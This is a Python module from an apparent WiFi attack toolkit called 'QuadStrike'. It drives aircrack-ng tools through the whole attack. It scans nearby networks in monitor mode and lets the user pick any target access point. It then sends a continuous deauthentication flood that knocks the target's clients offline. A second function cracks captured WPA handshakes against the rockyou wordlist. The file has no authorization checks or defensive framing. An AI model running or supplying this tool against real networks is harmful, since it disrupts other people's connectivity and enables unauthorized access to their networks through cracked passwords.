#!/usr/bin/env python3
"""
QuadStrike - Deauthentication Attack Module
Performs deauthentication attack on target WiFi network
"""

import subprocess
import csv
import os
import time
from color import *
from utils import list_all_interfaces, check_for_essid

def deauthentication_attack():
    """Perform deauthentication attack"""
    print(f"\n{GOLD}╔{'═' * 83}╗{RESET}")
    print(f"{GOLD}║{ORANGE}{BOLD}{'⚔️  DEAUTHENTICATION ATTACK MODULE  ⚔️':^92}{RESET}{GOLD}║{RESET}")
    print(f"{GOLD}╚{'═' * 83}╝{RESET}")
    
    # Get all interfaces
    all_ifaces = list_all_interfaces()
    if len(all_ifaces) == 0:
        print(f"\n{RED}[✗] No network interfaces detected. Please connect an adapter and try again.{RESET}")
        input(f"\n{GOLD}Press Enter to return to main menu...{RESET}")
        return

    print(f"\n{GOLD}[{GREEN}+{GOLD}] Detected network interfaces:{RESET}")
    print(f"{GOLD}{'─' * 85}{RESET}")
    for idx, iface in enumerate(all_ifaces):
        wflag = f"{GREEN}Wireless{RESET}" if iface["is_wireless"] else f"{CYAN}Wired{RESET}"
        mac_display = iface["mac"] if iface["mac"] else "unknown"
        print(f"{GOLD}    [{BRIGHT_GOLD}{idx}{GOLD}] ➤ {ORANGE}{iface['name']:12}{GOLD}  {wflag:16}  MAC: {CYAN}{mac_display}{RESET}")
    print(f"{GOLD}{'─' * 85}{RESET}")

    # Let user pick an interface
    while True:
        sel = input(f"\n{GOLD}[{BRIGHT_GOLD}?{GOLD}] Select interface index (must be wireless): {ORANGE}")
        print(RESET, end='')
        try:
            sel_i = int(sel)
            if sel_i < 0 or sel_i >= len(all_ifaces):
                raise ValueError
            chosen = all_ifaces[sel_i]
            break
        except Exception:
            print(f"{RED}[✗] Please enter a valid number from the list above.{RESET}")

    # Ensure the chosen interface is wireless
    if not chosen["is_wireless"]:
        print(f"\n{RED}[✗] Interface {chosen['name']} is not wireless. Wireless adapter required.{RESET}")
        input(f"\n{GOLD}Press Enter to return to main menu...{RESET}")
        return

    hacknic = chosen["name"]
    print(f"\n{GOLD}[{GREEN}✓{GOLD}] Using wireless interface: {ORANGE}{hacknic}{RESET}")
    
    print(f"{GOLD}[{GREEN}+{GOLD}] Killing conflicting processes...{RESET}")
    kill_confilict_processes = subprocess.run(["sudo", "airmon-ng", "check", "kill"])

    print(f"{GOLD}[{GREEN}+{GOLD}] Putting WiFi adapter into monitor mode...{RESET}")
    put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

    # Start airodump-ng
    monitor_iface = hacknic + "mon"
    discover_access_points = subprocess.Popen(
        ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", monitor_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    # Scanning loop
    active_wireless_networks = []
    try:
        while True:
            subprocess.call("clear", shell=True)
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
            for file_name in os.listdir():
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

            print(f"{GOLD}[{GREEN}+{GOLD}] Scanning networks... Press {RED}Ctrl+C{GOLD} to select target.{RESET}\n")
            print(f"{GOLD}No  │ BSSID              │ Channel │ ESSID{RESET}")
            print(f"{GOLD}────┼────────────────────┼─────────┼──────────────────────────────{RESET}")
            for index, item in enumerate(active_wireless_networks):
                print(f"{ORANGE}{index:2}{GOLD}  │ {CYAN}{item['BSSID']}{GOLD} │ {BRIGHT_GOLD}{item['channel'].strip():^7}{GOLD} │ {ORANGE}{item['ESSID']}{RESET}")
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n\n{GOLD}[{GREEN}✓{GOLD}] Ready to select target.{RESET}")

    # Select target
    while True:
        choice = input(f"\n{GOLD}[{BRIGHT_GOLD}?{GOLD}] Select target number: {ORANGE}")
        print(RESET, end='')
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print(f"{RED}[✗] Please try again.{RESET}")

    hackbssid = active_wireless_networks[int(choice)]["BSSID"]
    hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

    print(f"\n{GOLD}[{GREEN}+{GOLD}] Target: {CYAN}{hackbssid}{GOLD} on channel {BRIGHT_GOLD}{hackchannel}{RESET}")
    subprocess.run(["airmon-ng", "start", monitor_iface, hackchannel])
    
    print(f"{GOLD}[{RED}⚡{GOLD}] Launching deauthentication attack... (Press {RED}Ctrl+C{GOLD} to stop){RESET}")
    
    try:
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, monitor_iface])
    except KeyboardInterrupt:
        print(f"\n\n{GOLD}[{GREEN}✓{GOLD}] Deauthentication attack stopped by user.{RESET}")
    
    # Display success message
    print(f"\n{GOLD}╔{'═' * 83}╗{RESET}")
    print(f"{GOLD}║{GREEN}{BOLD}{'DEAUTHENTICATION ATTACK COMPLETED':^83}{RESET}{GOLD}║{RESET}")
    print(f"{GOLD}╚{'═' * 83}╝{RESET}")
    
    print(f"\n{GREEN}[✓] Attack executed successfully!{RESET}")
    print(f"{GOLD}[{CYAN}i{GOLD}] Target: {CYAN}{hackbssid}{GOLD} on channel {BRIGHT_GOLD}{hackchannel}{RESET}")
    print(f"{GOLD}[{CYAN}i{GOLD}] Deauthentication packets were sent to disconnect clients{RESET}")
    print(f"{GOLD}[{CYAN}i{GOLD}] Clients should have been temporarily disconnected from the AP{RESET}")
    
    # Clean up - kill any remaining aireplay-ng processes
    try:
        subprocess.run(["sudo", "pkill", "-9", "aireplay-ng"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except:
        pass
    
    input(f"\n{GOLD}Press Enter to return to main menu...{RESET}")

def crack_password_with_aircrack(cap_file, hackbssid):
    """Crack password using aircrack-ng with captured handshake"""
    # Ask for wordlist path
    print(f"\n{GOLD}[{BRIGHT_GOLD}?{GOLD}] Enter path to wordlist (default: /usr/share/wordlists/rockyou.txt): {ORANGE}", end='')
    wordlist_path = input().strip()
    print(RESET, end='')
    
    if not wordlist_path:
        wordlist_path = "/usr/share/wordlists/rockyou.txt"
    
    # Check if wordlist exists
    if not os.path.exists(wordlist_path):
        print(f"\n{RED}[✗] Wordlist not found at: {wordlist_path}{RESET}")
        print(f"{GOLD}[{CYAN}i{GOLD}] Please ensure rockyou.txt is extracted in /usr/share/wordlists/{RESET}")
        print(f"{GOLD}[{CYAN}i{GOLD}] Extract with: sudo gunzip /usr/share/wordlists/rockyou.txt.gz{RESET}")
        input(f"\n{GOLD}Press Enter to return to main menu...{RESET}")
        return

    print(f"\n{GOLD}[{GREEN}+{GOLD}] Using capture file: {ORANGE}{cap_file}{RESET}")
    print(f"{GOLD}[{GREEN}+{GOLD}] Target BSSID: {CYAN}{hackbssid}{RESET}")
    print(f"{GOLD}[{GREEN}+{GOLD}] Starting password cracking with aircrack-ng...{RESET}")
    print(f"{GOLD}[{CYAN}i{GOLD}] This may take a while depending on the wordlist size...{RESET}\n")
    print(f"{GOLD}{'═' * 85}{RESET}")

    # Run aircrack-ng
    try:
        result = subprocess.run(
            ["sudo", "aircrack-ng", "-w", wordlist_path, "-b", hackbssid, cap_file],
            capture_output=False,
            text=True
        )
        
        print(f"\n{GOLD}{'═' * 85}{RESET}")
        
        if result.returncode == 0:
            print(f"{GREEN}[✓] Password cracking process completed!{RESET}")
            print(f"{GOLD}[{CYAN}i{GOLD}] Check the output above for the password (if found).{RESET}")
        else:
            print(f"{ORANGE}[!] Cracking process finished but password may not have been found.{RESET}")
            print(f"{GOLD}[{CYAN}i{GOLD}] Possible reasons:{RESET}")
            print(f"{GOLD}    • Password not in wordlist{RESET}")
            print(f"{GOLD}    • Handshake not captured properly{RESET}")
            print(f"{GOLD}    • Try a different/larger wordlist{RESET}")
    
    except Exception as e:
        print(f"\n{RED}[✗] Error during cracking: {str(e)}{RESET}")

    input(f"\n{GOLD}Press Enter to return to main menu...{RESET}")
